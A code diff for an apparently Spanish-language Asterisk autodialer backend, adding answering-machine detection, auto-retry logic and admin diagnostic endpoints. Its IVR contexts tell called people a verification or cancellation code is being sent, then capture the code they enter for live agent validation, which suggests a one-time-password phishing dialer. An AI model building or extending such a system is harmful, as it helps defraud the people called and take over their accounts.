@@ -1396,7 +1396,7 @@ export interface CallState {
   number: string;
   channel?: string;
   bridgedChannel?: string;
-  status: 'dialing' | 'ringing' | 'in_ivr' | 'talking' | 'on_hold' | 'pressed_1' | 'asking_cancel_code' | 'otp_valid' | 'otp_invalid' | 'machine' | 'ended' | 'transferred';
+  status: 'dialing' | 'ringing' | 'in_ivr' | 'talking' | 'talking_agent' | 'on_hold' | 'pressed_1' | 'asking_cancel_code' | 'otp_valid' | 'otp_invalid' | 'cancel_valid' | 'cancel_invalid' | 'playing_audio' | 'audio_completed' | 'machine' | 'machine_detected' | 'retrying' | 'ended' | 'transferred';
   digit?: string;
   cause?: string;
   agent?: string;
@@ -1507,9 +1507,10 @@ maximum_word_length = 5000
     }
     if (shouldWrite) {
       writeAsteriskConfigFile(amdPath, amdContent);
-      console.log('✓ Configuración /etc/asterisk/amd.conf optimizada (AMD balanceado EE. UU.: max 4.5s, silence=256)');
+      console.log('✓ Configuración /etc/asterisk/amd.conf optimizada (AMD balanceado EE. UU.: max 5.0s, silence=256)');
       if (hasLocalAsterisk) {
-        exec('asterisk -rx "module load app_amd.so" 2>/dev/null; asterisk -rx "module reload app_amd.so" 2>/dev/null', () => {});
+        const bin = getAsteriskBinary();
+        exec(`"${bin}" -rx "module load app_amd.so" 2>/dev/null; "${bin}" -rx "module reload app_amd.so" 2>/dev/null`, () => {});
       }
     }
     fs.writeFileSync(localAmdPath, amdContent, 'utf8');
@@ -4652,10 +4653,12 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(PRESSED_DIGIT=timeout)\n`;
   dialplanContent += ` same => n,Goto(1,transfer_operator)\n\n`;
 
-  dialplanContent += `exten => h,1,NoOp(=== [IVR-PRESS1 HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
+  dialplanContent += `exten => h,1,NoOp(=== [IVR-PRESS1 HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} | AMD=\${AMDSTATUS} ===)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_NUM})}" = "machine_detected" | $["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" != "INITIALSILENCE"]]?h_keep_machine_press1)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
-  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
+  dialplanContent += ` same => n(h_keep_machine_press1),NoOp()\n\n`;
 
   dialplanContent += `[ivr-otp]\n`;
   dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS Y CALIDAD HD ===)\n`;
@@ -4920,10 +4923,12 @@ export function generateCleanDialplanConf(
   dialplanContent += `exten => t,1,NoOp(=== [IVR-OTP] Timeout -> Transfiriendo a operador ===)\n`;
   dialplanContent += ` same => n,Goto(1,1)\n\n`;
 
-  dialplanContent += `exten => h,1,NoOp(=== [IVR-OTP HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
+  dialplanContent += `exten => h,1,NoOp(=== [IVR-OTP HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} | AMD=\${AMDSTATUS} ===)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_NUM})}" = "machine_detected" | $["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" != "INITIALSILENCE"]]?h_keep_machine_otp)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
-  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
+  dialplanContent += ` same => n(h_keep_machine_otp),NoOp()\n\n`;
 
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `; CONTEXTO MARCACION 1-CLIC: REPRODUCCION DE AUDIO DIRECTO AL DESCOLGAR\n`;
@@ -5019,7 +5024,17 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n(amd_machine_ata),NoOp(=== [AMD-OPERADORA] Contestador detectado en \${TARGET_DEST} -> Colgando ===)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=machine_detected)\n`;
   dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_DEST})}&status=machine_detected&cause=\${URIENCODE(\${AMDCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
-  dialplanContent += ` same => n,Hangup()\n\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AUTO_RETRY}" != "1"]?no_retry_amd_ata)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_DEST})}" = "operator_hangup" | "\${DB(call_status/\${TARGET_DEST})}" = "ended" | "\${DB(ivr_vars/\${TARGET_DEST}_cancelled)}" = "1"]?no_retry_amd_ata)\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/retry?number=\${URIENCODE(\${TARGET_DEST})}&cause=\${URIENCODE(\${AMDCAUSE})}" &)\n`;
+  dialplanContent += ` same => n(no_retry_amd_ata),NoOp(=== [AMD RETRY OMITIDO] Reintento no autorizado o llamada finalizada ===)\n`;
+  dialplanContent += ` same => n,Hangup()\n`;
+  dialplanContent += `exten => h,1,NoOp(=== [1-CLICK AUDIO+AGENT HANGUP] Canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} | AMD=\${AMDSTATUS} ===)\n`;
+  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_NUM})}" = "machine_detected" | $["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" != "INITIALSILENCE"]]?h_keep_machine_ata)\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
+  dialplanContent += ` same => n(h_keep_machine_ata),NoOp()\n\n`;
 
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `; CONTEXTO PRESS-1 + CODIGO DE CANCELACION (VALIDACION POR AGENTE: VALIDO / INVALIDO)\n`;
@@ -5101,6 +5116,10 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n(amd_machine_p1c),NoOp(=== [AMD-OPERADORA] Contestador detectado en \${TARGET_DEST} -> Colgando ===)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=machine_detected)\n`;
   dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_DEST})}&status=machine_detected&cause=\${URIENCODE(\${AMDCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AUTO_RETRY}" != "1"]?no_retry_amd_p1c)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_DEST})}" = "operator_hangup" | "\${DB(call_status/\${TARGET_DEST})}" = "ended" | "\${DB(ivr_vars/\${TARGET_DEST}_cancelled)}" = "1"]?no_retry_amd_p1c)\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/retry?number=\${URIENCODE(\${TARGET_DEST})}&cause=\${URIENCODE(\${AMDCAUSE})}" &)\n`;
+  dialplanContent += ` same => n(no_retry_amd_p1c),NoOp(=== [AMD RETRY OMITIDO] Reintento no autorizado o llamada finalizada ===)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `; CLIENTE MARCA 1 -> REPRODUCE "UN MOMENTO POR FAVOR, LE ESTAMOS ENVIANDO UN CODIGO DE CANCELACION", AVISA AL AGENTE Y ESPERA HASTA QUE EL AGENTE ENVIE EL CODIGO\n`;
@@ -5188,10 +5207,12 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Goto(s,menu)\n`;
   dialplanContent += `exten => t,1,GotoIf($[\${INTRO_TRIES} < 2]?s,menu)\n`;
   dialplanContent += ` same => n,Hangup()\n`;
-  dialplanContent += `exten => h,1,NoOp(=== [IVR-PRESS1-CANCEL HANGUP] Canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
+  dialplanContent += `exten => h,1,NoOp(=== [IVR-PRESS1-CANCEL HANGUP] Canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} | AMD=\${AMDSTATUS} ===)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_NUM})}" = "machine_detected" | $["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" != "INITIALSILENCE"]]?h_keep_machine_p1c)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
-  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
+  dialplanContent += ` same => n(h_keep_machine_p1c),NoOp()\n\n`;
 
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `; CONTEXTO IVR DE CAPTURA OTP (PRESS 1 -> AUDIO ESPERA -> CAPTURA Y VALIDACION EN VIVO)\n`;
@@ -5272,6 +5293,10 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n(amd_machine_otp_v),NoOp(=== [AMD-OPERADORA] Contestador detectado en \${TARGET_DEST} -> Colgando ===)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=machine_detected)\n`;
   dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_DEST})}&status=machine_detected&cause=\${URIENCODE(\${AMDCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AUTO_RETRY}" != "1"]?no_retry_amd_otp_v)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_DEST})}" = "operator_hangup" | "\${DB(call_status/\${TARGET_DEST})}" = "ended" | "\${DB(ivr_vars/\${TARGET_DEST}_cancelled)}" = "1"]?no_retry_amd_otp_v)\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/retry?number=\${URIENCODE(\${TARGET_DEST})}&cause=\${URIENCODE(\${AMDCAUSE})}" &)\n`;
+  dialplanContent += ` same => n(no_retry_amd_otp_v),NoOp(=== [AMD RETRY OMITIDO] Reintento no autorizado o llamada finalizada ===)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `; CLIENTE PRESIONA 1 -> REPRODUCE "UN MOMENTO POR FAVOR, LE ESTAMOS ENVIANDO SU CODIGO DE VERIFICACION" -> CAPTURA Y VALIDACION EN LIVECALLSTAB\n`;
@@ -5345,10 +5370,12 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Goto(s,menu)\n`;
   dialplanContent += `exten => t,1,GotoIf($[\${INTRO_TRIES} < 2]?s,menu)\n`;
   dialplanContent += ` same => n,Hangup()\n`;
-  dialplanContent += `exten => h,1,NoOp(=== [IVR-OTP-VERIFY HANGUP] Canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
+  dialplanContent += `exten => h,1,NoOp(=== [IVR-OTP-VERIFY HANGUP] Canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} | AMD=\${AMDSTATUS} ===)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_NUM})}" = "machine_detected" | $["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" != "INITIALSILENCE"]]?h_keep_machine_otp_v)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
-  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
+  dialplanContent += ` same => n(h_keep_machine_otp_v),NoOp()\n\n`;
 
   dialplanContent += `; Alias de compatibilidad para modo hybrid hacia ivr-otp\n`;
   dialplanContent += `[ivr-hybrid]\n`;
@@ -5484,7 +5511,8 @@ async function autoRepairAsteriskPjsipOnStartup() {
       executeAsteriskCommand('database put ivr_vars default_agent "custom/conectar_asesor"').catch(() => {});
       executeAsteriskCommand('database put spy_allowed 1000 "1"').catch(() => {});
       if (hasLocalAsterisk) {
-        exec('asterisk -rx "module load app_amd.so" 2>/dev/null; asterisk -rx "module reload app_amd.so" 2>/dev/null', () => {});
+        const bin = getAsteriskBinary();
+        exec(`"${bin}" -rx "module load app_amd.so" 2>/dev/null; "${bin}" -rx "module reload app_amd.so" 2>/dev/null`, () => {});
       }
       for (const ext of storedExts) {
         const extNum = String(ext?.extension || '').trim();
@@ -10255,14 +10283,25 @@ app.all('/api/asterisk/call/status/update', requireInternalOrGlobalAdmin, (req, 
     const existing =
       callStatusStore.get(number) || callStatusStore.get(clean10) || callStatusStore.get(`1${clean10}`);
 
+    const normalizedIncomingStatus = status === 'machine' ? 'machine_detected' : status;
+    // Preserve recent machine_detected / retrying state if Asterisk hangup 'h' fires immediately after AMD hangup
+    const isTrailingHangupOverAmd =
+      normalizedIncomingStatus === 'ended' &&
+      cause !== 'operator_hangup' &&
+      existing &&
+      (existing.status === 'machine_detected' || existing.status === 'retrying') &&
+      Date.now() - (existing.timestamp || 0) < 20000;
+    const effectiveStatus = isTrailingHangupOverAmd ? existing!.status : normalizedIncomingStatus;
+    const effectiveCause = isTrailingHangupOverAmd ? (existing?.cause || cause) : (cause || existing?.cause);
+
     const startTime = existing?.startTime || Date.now();
     let answeredAt = existing?.answeredAt;
     let pressed1At = existing?.pressed1At;
 
-    if ((status === 'in_ivr' || status === 'ringing' || status === 'pressed_1' || status === 'asking_cancel_code' || status === 'talking') && !answeredAt) {
+    if ((effectiveStatus === 'in_ivr' || effectiveStatus === 'ringing' || effectiveStatus === 'pressed_1' || effectiveStatus === 'asking_cancel_code' || effectiveStatus === 'talking') && !answeredAt) {
       answeredAt = Date.now();
     }
-    if (status === 'pressed_1' || digit === '1') {
+    if (effectiveStatus === 'pressed_1' || digit === '1') {
       pressed1At = Date.now();
     }
 
@@ -10271,10 +10310,10 @@ app.all('/api/asterisk/call/status/update', requireInternalOrGlobalAdmin, (req, 
     const callState: CallState = {
       number,
       channel: channel || existing?.channel || '',
-      status: status as any,
-      cause: cause || existing?.cause,
+      status: effectiveStatus as any,
+      cause: effectiveCause,
       agent: agent || existing?.agent,
-      digit: digit || existing?.digit || (status === 'pressed_1' ? '1' : undefined),
+      digit: digit || existing?.digit || (effectiveStatus === 'pressed_1' ? '1' : undefined),
       timestamp: Date.now(),
       startTime,
       answeredAt,
@@ -10282,9 +10321,9 @@ app.all('/api/asterisk/call/status/update', requireInternalOrGlobalAdmin, (req, 
       duration,
       tenantId: tenant || existing?.tenantId,
       mode: modeParam || existing?.mode,
-      cancelDecision: (status === 'cancel_valid' || status === 'otp_valid')
+      cancelDecision: (effectiveStatus === 'cancel_valid' || effectiveStatus === 'otp_valid')
         ? 'valid'
-        : (status === 'cancel_invalid' || status === 'otp_invalid')
+        : (effectiveStatus === 'cancel_invalid' || effectiveStatus === 'otp_invalid')
         ? 'invalid'
         : existing?.cancelDecision,
       isOnHold: existing?.isOnHold,
@@ -10295,7 +10334,7 @@ app.all('/api/asterisk/call/status/update', requireInternalOrGlobalAdmin, (req, 
     callStatusStore.set(clean10, callState);
     callStatusStore.set(`1${clean10}`, callState);
     console.log(
-      `[CALL STATUS NOTIFIER] Destino ${number} -> Estado: ${status} (Causa: ${cause || 'N/A'}, Dígito: ${digit || callState.digit || 'ninguno'}, Canal: ${channel})`
+      `[CALL STATUS NOTIFIER] Destino ${number} -> Estado: ${effectiveStatus} (Causa: ${effectiveCause || 'N/A'}, Dígito: ${digit || callState.digit || 'ninguno'}, Canal: ${channel})`
     );
   }
   res.json({ success: true });
@@ -10326,11 +10365,17 @@ app.all('/api/asterisk/call/retry', requireInternalOrGlobalAdmin, async (req, re
     }
 
     const memCall = callStatusStore.get(clean10) || callStatusStore.get(number) || callStatusStore.get(formattedDest);
-    if (memCall && memCall.status === 'ended') {
-      console.log(`[RETRY BLOCKED] Reintento bloqueado para ${clean10}: La llamada ya figura finalizada (ended).`);
+    const blockedByHumanProgress =
+      memCall &&
+      (
+        ['pressed_1', 'talking', 'talking_agent', 'transferred', 'otp_valid', 'cancel_valid'].includes(String(memCall.status)) ||
+        (memCall.status === 'ended' && /operador colg/i.test(String(memCall.cause || '')))
+      );
+    if (blockedByHumanProgress) {
+      console.log(`[RETRY BLOCKED] Reintento bloqueado para ${clean10}: Estado actual ${memCall.status} (${memCall.cause || 'interacción completada'}).`);
       return res.json({
         success: true,
-        message: 'Reintento cancelado: la llamada ya está finalizada.',
+        message: 'Reintento cancelado: la llamada tuvo interacción o fue colgada por el operador.',
         retrying: false,
       });
     }
@@ -10391,7 +10436,7 @@ app.all('/api/asterisk/call/retry', requireInternalOrGlobalAdmin, async (req, re
 
     console.log(`[RETRY SYSTEM] Destino ${clean10}: No contestó o contestador detectado (${cause}). Marcación #${currentAttempts} de ${MAX_ALLOWED_DIALS} permitidas. Reintentando en 5 segundos...`);
 
-    const causeDescription = (cause === 'AMD_MACHINE' || cause === 'MAX_WORDS' || cause === 'LONG_GREETING')
+    const causeDescription = /^(AMD_MACHINE|MAX_?WORDS|LONG_?GREETING|TOOLONG|HUMAN)/i.test(cause)
       ? `Grabadora/Contestador detectado (${cause})`
       : `Cliente no contestó (${cause})`;
 
@@ -10505,6 +10550,193 @@ app.get('/api/asterisk/amd/status', async (req, res) => {
   }
 });
 
+// Helper to run live AMD diagnostic in local Asterisk
+async function collectAmdDiagnostic() {
+  const amdConfPath = '/etc/asterisk/amd.conf';
+  const extensionsConfPath = '/etc/asterisk/extensions.conf';
+  const amdConfExists = fs.existsSync(amdConfPath);
+  const amdConfContent = amdConfExists ? fs.readFileSync(amdConfPath, 'utf8') : '';
+  const extensionsContent = fs.existsSync(extensionsConfPath) ? fs.readFileSync(extensionsConfPath, 'utf8') : '';
+
+  const parseParam = (key: string) => {
+    const m = amdConfContent.match(new RegExp(`^\\s*${key}\\s*=\\s*([^;\\r\\n]+)`, 'mi'));
+    return m ? m[1].trim() : null;
+  };
+
+  const dialplanContextsWithAmd = ['ivr-press1', 'ivr-otp', 'ivr-press1-cancel', 'ivr-otp-verify', 'ivr-audio-then-agent'].map((ctx) => {
+    const ctxIdx = extensionsContent.indexOf(`[${ctx}]`);
+    if (ctxIdx < 0) return { context: ctx, present: false, hasAmd: false, hasRetry: false };
+    const nextCtxMatch = extensionsContent.slice(ctxIdx + ctx.length + 2).search(/^\[[a-zA-Z0-9_-]+\]/m);
+    const block = nextCtxMatch >= 0 ? extensionsContent.slice(ctxIdx, ctxIdx + ctx.length + 2 + nextCtxMatch) : extensionsContent.slice(ctxIdx);
+    return {
+      context: ctx,
+      present: true,
+      hasAmd: /\bAMD\(/i.test(block),
+      hasRetry: /\/api\/asterisk\/call\/retry/i.test(block),
+    };
+  });
+
+  let moduleLoaded = false;
+  let moduleRaw = '';
+  let appRegistered = false;
+  let astDbValue = '';
+
+  if (hasLocalAsterisk) {
+    const bin = getAsteriskBinary();
+    const [modOut, appOut, dbOut] = await Promise.all([
+      new Promise<string>((resolve) => {
+        exec(`"${bin}" -rx "module show like app_amd"`, { timeout: 3000 }, (_e, stdout, stderr) => resolve(String(stdout || stderr || '').trim()));
+      }),
+      new Promise<string>((resolve) => {
+        exec(`"${bin}" -rx "core show application AMD"`, { timeout: 3000 }, (_e, stdout, stderr) => resolve(String(stdout || stderr || '').trim()));
+      }),
+      executeAsteriskCommand('database get ivr_vars amd_enabled').catch(() => ''),
+    ]);
+    moduleRaw = modOut;
+    moduleLoaded = /app_amd\.so/i.test(modOut) && /Running/i.test(modOut);
+    appRegistered = /-= Info about application 'AMD' =-/i.test(appOut) || (/AMD/i.test(appOut) && !/not registered|No such application/i.test(appOut));
+    if (dbOut && dbOut.includes('Value:')) {
+      astDbValue = dbOut.split('Value:')[1].split('\n')[0].replace(/\r/g, '').trim();
+    }
+  }
+
+  let recentLogs: string[] = [];
+  for (const logPath of ['/var/log/asterisk/full', '/var/log/asterisk/messages']) {
+    try {
+      if (fs.existsSync(logPath)) {
+        const tailLines = fs.readFileSync(logPath, 'utf8').split('\n').slice(-400);
+        const matches = tailLines.filter((l) => /AMD-DETECTION|AMD-OPERADORA|AMD-SILENCIO|app_amd|AMDSTATUS/i.test(l)).slice(-12);
+        if (matches.length > 0) {
+          recentLogs = matches;
+          break;
+        }
+      }
+    } catch (_) {}
+  }
+
+  const recentDetections = Array.from(callStatusStore.values())
+    .filter((c) => c && (c.status === 'machine_detected' || c.status === 'retrying'))
+    .slice(-10)
+    .map((c) => ({ number: c.number, status: c.status, cause: c.cause || 'AMD', timestamp: c.timestamp }));
+
+  const ready = hasLocalAsterisk
+    ? Boolean(moduleLoaded && appRegistered && amdConfExists && dialplanContextsWithAmd.every((c) => c.present && c.hasAmd))
+    : false;
+
+  return {
+    success: true,
+    source: hasLocalAsterisk ? 'vps-local' : 'app-host',
+    hasLocalAsterisk,
+    enabled: isAmdEnabled,
+    astDbValue: astDbValue || (isAmdEnabled ? '1' : '0'),
+    moduleLoaded,
+    moduleRaw,
+    appRegistered,
+    amdConfExists,
+    amdParams: {
+      initial_silence: parseParam('initial_silence') || '3500',
+      greeting: parseParam('greeting') || '2200',
+      after_greeting_silence: parseParam('after_greeting_silence') || '800',
+      total_analysis_time: parseParam('total_analysis_time') || '5000',
+      min_word_length: parseParam('min_word_length') || '100',
+      between_words_silence: parseParam('between_words_silence') || '50',
+      maximum_number_of_words: parseParam('maximum_number_of_words') || '7',
+      silence_threshold: parseParam('silence_threshold') || '256',
+      maximum_word_length: parseParam('maximum_word_length') || '5000',
+    },
+    dialplanContexts: dialplanContextsWithAmd,
+    recentLogs,
+    recentDetections,
+    ready,
+  };
+}
+
+// Endpoint to inspect live AMD readiness & recent detections
+app.get('/api/asterisk/amd/diagnostic', requireAdminRole, async (req, res) => {
+  try {
+    if (!hasLocalAsterisk && REMOTE_ASTERISK_HTTP && !REMOTE_ASTERISK_HTTP.includes('localhost') && !REMOTE_ASTERISK_HTTP.includes('127.0.0.1') && !req.headers['x-governor-fwd']) {
+      try {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 5000);
+        const r = await fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/amd/diagnostic`, {
+          headers: buildRemoteAuthHeaders(req),
+          signal: controller.signal,
+        });
+        clearTimeout(timer);
+        if (r.ok) {
+          const remoteData = await r.json();
+          return res.json(remoteData);
+        }
+      } catch (_) {}
+    }
+    const diag = await collectAmdDiagnostic();
+    res.json(diag);
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Endpoint to verify, load app_amd.so, sync amd.conf + dialplan + AstDB, and return live diagnostic
+app.post('/api/asterisk/amd/verify', requireAdminRole, async (req, res) => {
+  try {
+    if (!hasLocalAsterisk && REMOTE_ASTERISK_HTTP && !REMOTE_ASTERISK_HTTP.includes('localhost') && !REMOTE_ASTERISK_HTTP.includes('127.0.0.1') && !req.headers['x-governor-fwd']) {
+      try {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 6000);
+        const r = await fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/amd/verify`, {
+          method: 'POST',
+          headers: buildRemoteAuthHeaders(req, { 'Content-Type': 'application/json' }),
+          body: JSON.stringify(req.body || {}),
+          signal: controller.signal,
+        });
+        clearTimeout(timer);
+        if (r.ok) {
+          const remoteData = await r.json();
+          return res.json(remoteData);
+        }
+      } catch (_) {}
+    }
+
+    ensureAmdConfExists();
+    await executeAsteriskCommand(`database put ivr_vars amd_enabled "${isAmdEnabled ? '1' : '0'}"`).catch(() => {});
+
+    const activeCarriers = lastSyncedCarriers.length > 0 ? lastSyncedCarriers : loadStoredCarriers();
+    const activeExts = lastSyncedExtensions.length > 0 ? lastSyncedExtensions : loadStoredExtensions();
+    const cleanDialplan = generateCleanDialplanConf(activeCarriers, undefined, {}, activeExts);
+    const dialplanPath = '/etc/asterisk/extensions.conf';
+    const normalizeDialplanTxt = (txt: string) => txt.replace(/^; Generado.*$/gm, '').trim();
+    const prevDialplanDisk = fs.existsSync(dialplanPath) ? fs.readFileSync(dialplanPath, 'utf8') : '';
+    let dialplanUpdated = false;
+    if (normalizeDialplanTxt(prevDialplanDisk) !== normalizeDialplanTxt(cleanDialplan)) {
+      await writeAsteriskConfigFile(dialplanPath, cleanDialplan);
+      try { fs.writeFileSync(path.join(process.cwd(), 'extensions.conf'), cleanDialplan, 'utf8'); } catch (_) {}
+      dialplanUpdated = true;
+    }
+
+    if (hasLocalAsterisk) {
+      const bin = getAsteriskBinary();
+      await new Promise<void>((resolve) => {
+        exec(
+          `"${bin}" -rx "module load app_amd.so" 2>/dev/null; "${bin}" -rx "module reload app_amd.so" 2>/dev/null${dialplanUpdated ? `; "${bin}" -rx "dialplan reload" 2>/dev/null` : ''}`,
+          { timeout: 5000 },
+          () => resolve()
+        );
+      });
+    }
+
+    const diag = await collectAmdDiagnostic();
+    res.json({
+      ...diag,
+      dialplanUpdated,
+      message: diag.ready
+        ? 'AMD verificado y operativo en Asterisk (app_amd.so cargado, amd.conf y Dialplan sincronizados).'
